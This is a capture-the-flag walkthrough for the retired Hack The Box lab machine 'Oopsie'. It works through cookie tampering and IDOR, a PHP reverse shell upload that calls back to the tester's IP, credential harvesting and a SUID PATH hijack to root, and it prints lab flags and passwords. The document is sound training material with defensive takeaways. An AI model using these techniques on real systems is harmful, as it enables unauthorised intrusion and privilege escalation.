+++
title = "HTB Starting Point — Oopsie"
date = "2026-03-06T00:00:00-05:00"
tags = ["htb", "starting-point", "linux", "web", "cookie-manipulation", "idor", "file-upload", "rce", "privesc", "path-hijack", "suid", "retired"]
description = "Full walkthrough of Hack The Box Oopsie — web enumeration, IDOR/cookie manipulation to reach the upload page, PHP reverse shell, credential harvesting for lateral movement, and SUID PATH hijack to root."
draft = false
+++

## Machine Info

| Field       | Value                              |
|-------------|------------------------------------|
| Name        | Oopsie                             |
| Platform    | Hack The Box — Starting Point      |
| Tier        | Tier 2                             |
| Difficulty  | Very Easy                          |
| OS          | Linux (Ubuntu 18.04 Bionic)        |
| Release     | 2021                               |
| Tags        | Web, IDOR, Cookie Manipulation, File Upload, PHP, RCE, SUID, PATH Hijack |

Oopsie is the second box in the HTB Starting Point Tier 2 path. It builds on credentials carried over from the first box (Archetype) and introduces a chain of: web enumeration → guest login with cookie manipulation → IDOR to enumerate a super admin account → PHP reverse shell upload → credential harvesting from a PHP database file → lateral movement to `robert` → SUID binary exploitation via PATH hijack to root.

---

## 1. Initial Enumeration (nmap)

```bash
sudo nmap -sV -sC 10.10.10.28 -oN oopsie.nmap
```

Full relevant output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:42:33 (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Two open ports:

- **22/tcp** — OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- **80/tcp** — Apache httpd 2.4.29, page title "Welcome"

The SSH version fingerprints to Ubuntu Bionic (18.04) via launchpad.net.

---

## 2. Web Enumeration — Port 80

Navigating to `http://10.10.10.28/` shows a static "MegaCorp Automotive" welcome page. There is no login form visible on the landing page.

### Finding the hidden login path

View the page source (`Ctrl+U` in Firefox). Near the bottom of the HTML, the following script tag is embedded:

```html
<script src="/cdn-cgi/login/script.js"></script>
```

This reveals the hidden login path: **`/cdn-cgi/login/`**

Navigate to `http://10.10.10.28/cdn-cgi/login/`. This presents a login page for a "Repair Management System" belonging to MegaCorp.

The page has two options:
1. A standard username/password login form
2. A **"Login as Guest"** button

### Directory enumeration (optional confirmation)

Running gobuster confirms the path and also finds the `/uploads/` directory:

```bash
gobuster dir -u http://10.10.10.28/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php \
  -o gobuster.txt
```

Key results:

```
/uploads              (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/images               (Status: 301)
/themes               (Status: 301)
/index.php            (Status: 200)
```

The `/uploads/` directory returns 403 at this stage (access forbidden without proper privileges).

---

## 3. Logging In — Admin Credentials from Archetype

The admin credentials from the previous Starting Point box (Archetype) work here:

- **Username:** `admin`
- **Password:** `MEGACORP_4dm1n!!`

After logging in, the browser is redirected to the admin panel at `/cdn-cgi/login/admin.php`. The panel has a left-hand menu with entries for: **Account**, **Branding**, **Clients**, **Uploads**.

Clicking **Uploads** returns:

```
This action require super admin rights.
```

---

## 4. Cookie Manipulation and IDOR — Reaching the Upload Page

### Identifying the cookies

After logging in as admin, open Firefox Developer Tools (`F12`) and go to **Storage → Cookies**. Two cookies are set:

| Cookie | Value |
|--------|-------|
| `user` | `34322` |
| `role` | `admin` |

The `user` cookie holds the account's **Access ID**, and the `role` cookie holds the privilege level. These are not signed or protected — they can be edited directly in the browser.

### Logging in as Guest first (alternative starting point)

If you do not have the admin credentials from Archetype, click **"Login as Guest"** on the login page. The guest session sets:

| Cookie | Value |
|--------|-------|
| `user` | `2233` |
| `role` | `guest` |

From the guest session you can still browse to the accounts endpoint and enumerate IDs.

### Enumerating accounts to find the super admin

The admin panel exposes user accounts at:

```
http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=<N>
```

The `id` parameter is an IDOR. Each numeric value returns a different user's **Access ID**, name, and email address.

Use wfuzz to brute-force it. The `--hh 3595` flag filters out responses whose HTML size equals the "no result" page (3595 characters), leaving only pages that contain a real user record:

```bash
wfuzz -c \
  -z range,1-100 \
  --hh 3595 \
  -b "role=admin" \
  -b "user=34322" \
  -u "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=FUZZ"
```

Alternatively, a simple curl loop works:

```bash
for i in $(seq 1 100); do
  result=$(curl -s -b "user=34322; role=admin" \
    "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=$i" \
    | grep -i "super admin")
  if [ -n "$result" ]; then echo "Found at id=$i: $result"; fi
done
```

**Key results from enumeration:**

| URL `id` parameter | Access ID | Name        | Email                    |
|--------------------|-----------|-------------|--------------------------|
| 1                  | 34322     | admin       | admin@megacorp.com       |
| 30                 | 86575     | super admin | superadmin@megacorp.com  |

The **super admin** account has Access ID **`86575`** and is located at `id=30`.

### Modifying the cookies

In Firefox Developer Tools (**Storage → Cookies**), double-click the `user` value and change it from `34322` to `86575`. Change the `role` value from `admin` to `superadmin`.

Updated cookies:

| Cookie | Value   |
|--------|---------|
| `user` | `86575` |
| `role` | `superadmin` |

Reload the page. The **Uploads** menu item now works without the "super admin required" error.

---

## 5. File Upload Exploitation — PHP Reverse Shell

### Preparing the shell

Copy the pentestmonkey PHP reverse shell from Kali's default webshells:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

Open `shell.php` and edit two lines near the top:

```php
$ip = '10.10.14.x';   // change to your HTB VPN IP (tun0)
$port = 4444;          // or any port you prefer
```

### Uploading

With the super admin cookies set, navigate to the **Uploads** page at:

```
http://10.10.10.28/cdn-cgi/login/admin.php?content=upload
```

Browse to `shell.php` and click Upload. The application accepts the file without any content-type or extension filtering — no bypass is required.

The upload success message confirms the file was stored. Uploaded files land in the `/uploads/` directory discovered earlier.

### Starting the listener

```bash
nc -lvnp 4444
```

### Triggering the shell

```bash
curl http://10.10.10.28/uploads/shell.php
```

Or simply navigate to `http://10.10.10.28/uploads/shell.php` in the browser.

The netcat listener receives a connection:

```
connect to [10.10.14.x] from (UNKNOWN) [10.10.10.28] 55432
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 6. Shell Stabilisation

The initial shell from pentestmonkey's reverse shell script is already a PTY shell (it uses `/bin/sh -i` internally), but it's still worth upgrading for reliability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then background it with `Ctrl+Z` and fix the terminal settings:

```bash
stty raw -echo
fg
```

Then in the shell:

```bash
export TERM=xterm
```

You now have a fully interactive shell as `www-data` with working tab completion, arrow keys, and `Ctrl+C`.

Confirm identity:

```
www-data@oopsie:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. Lateral Movement — Finding robert's Credentials

### Locating db.php

The login application lives at `/var/www/html/cdn-cgi/login/`. Read the database configuration file:

```bash
cat /var/www/html/cdn-cgi/login/db.php
```

Contents:

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

This gives us credentials for the `robert` OS user:

- **Username:** `robert`
- **Password:** `M3g4C0rpUs3r!`

### Switching to robert

```bash
su robert
# Password: M3g4C0rpUs3r!
```

Confirm:

```
robert@oopsie:/$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Robert belongs to the `bugtracker` group — this is significant for the next step.

---

## 8. User Flag

```bash
cat /home/robert/user.txt
```

```
f2c74ee8db7983851ab2a96a44eb7981
```

Path: `/home/robert/user.txt`

---

## 9. SSH as robert (optional)

With the password in hand, a proper SSH session is cleaner than the su session inside www-data's shell:

```bash
ssh robert@10.10.10.28
# Password: M3g4C0rpUs3r!
```

---

## 10. Privilege Escalation — SUID Binary and PATH Hijack

### Finding the SUID binary

Robert is in the `bugtracker` group. Search for files owned by that group:

```bash
find / -type f -group bugtracker 2>/dev/null
```

Output:

```
/usr/bin/bugtracker
```

Check the permissions:

```bash
ls -la /usr/bin/bugtracker
```

```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker
```

The `s` in the owner execute position is the SUID bit. When `bugtracker` runs, it runs as **root** regardless of who invokes it. The file is executable by anyone in the `bugtracker` group — which includes `robert`.

### Analysing the binary

```bash
strings /usr/bin/bugtracker
```

Key output (relevant lines):

```
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
...
```

The binary:
1. Prints a "Bug Tracker" banner
2. Prompts for a Bug ID
3. Calls `cat /root/reports/<BugID>` to display the report

**Critical detail:** it calls `cat` using a **relative path**, not `/bin/cat`. This means it searches the directories listed in `$PATH` in order to find `cat` — and that list is under our control.

### PATH hijack exploit

Navigate to `/tmp` and create a malicious `cat` binary:

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
```

Prepend `/tmp` to `$PATH` so our fake `cat` is found first:

```bash
export PATH=/tmp:$PATH
```

Verify the PATH change:

```bash
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Now run the bugtracker binary:

```bash
/usr/bin/bugtracker
```

Output:

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------
```

After entering `1` (any input will do), instead of running `/bin/cat`, the binary executes `/tmp/cat` — which is our `/bin/sh` — **as root** (because of the SUID bit).

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

You are root.

---

## 11. Root Flag

```bash
cat /root/root.txt
```

```
af13b0bee69f8a877c3faf667f7beacf
```

Path: `/root/root.txt`

---

## 12. Post-Exploitation — Credentials for Vaccine

While in the root shell, check root's hidden configuration directory:

```bash
ls /root/.config/filezilla/
```

```
filezilla.xml
```

Read the file:

```bash
cat /root/.config/filezilla/filezilla.xml
```

Contents (abridged):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.44</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
        </Server>
    </RecentServers>
</FileZilla3>
```

**FTP credentials for the next box (Vaccine):**

- **Host:** 10.10.10.44
- **Port:** 21
- **Username:** `ftpuser`
- **Password:** `mc@F1l3ZilL4`

---

## Summary of Flags

| Flag      | Path                       | Value                              |
|-----------|----------------------------|------------------------------------|
| user.txt  | `/home/robert/user.txt`    | `f2c74ee8db7983851ab2a96a44eb7981` |
| root.txt  | `/root/root.txt`           | `af13b0bee69f8a877c3faf667f7beacf` |

---

## Full Attack Chain

```
nmap scan
  -> port 80: Apache 2.4.29
      -> view page source -> /cdn-cgi/login/script.js reference
          -> /cdn-cgi/login/ login page
              -> admin:MEGACORP_4dm1n!! (carried from Archetype)
                  -> cookies: user=34322; role=admin
                      -> IDOR at ?content=accounts&id=
                          -> wfuzz id=1..100 -> id=30: Access ID 86575 (super admin)
                              -> edit cookies: user=86575; role=superadmin
                                  -> /uploads page unlocked
                                      -> upload php-reverse-shell.php
                                          -> nc -lvnp 4444
                                              -> curl /uploads/shell.php -> shell as www-data
                                                  -> python3 pty + stty raw -echo
                                                      -> cat /var/www/html/cdn-cgi/login/db.php
                                                          -> robert:M3g4C0rpUs3r!
                                                              -> su robert -> user.txt
                                                                  -> id -> groups: bugtracker
                                                                      -> find / -group bugtracker
                                                                          -> /usr/bin/bugtracker (SUID root)
                                                                              -> strings -> cat /root/reports/ (relative)
                                                                                  -> cd /tmp; echo '/bin/sh' > cat; chmod +x cat
                                                                                      -> export PATH=/tmp:$PATH
                                                                                          -> /usr/bin/bugtracker -> root shell
                                                                                              -> root.txt
                                                                                                  -> /root/.config/filezilla/filezilla.xml
                                                                                                      -> ftpuser:mc@F1l3ZilL4 (for Vaccine)
```

---

## Key Takeaways

- **Information disclosure in page source** is a low-hanging fruit that is often overlooked. A script tag reference to `/cdn-cgi/login/script.js` gave away the entire admin panel location.
- **Client-side cookies are not access controls.** The application trusted the `role` and `user` cookies without any server-side validation. Changing them in DevTools was sufficient to escalate from guest to super admin.
- **IDOR via URL parameter** allowed full account enumeration. The `id` parameter on the accounts page iterated through every user record with no authentication check beyond the cookie.
- **No file upload filter** was present — the PHP shell uploaded without any bypass needed. Even a basic extension or MIME-type check would have blocked this.
- **Credentials reuse in PHP config files** is extremely common. `db.php` credentials were reused as OS-level credentials for `robert`.
- **Relative paths in SUID binaries** are a classic privilege escalation pattern. Any SUID binary that calls another program without an absolute path is vulnerable to PATH hijacking.
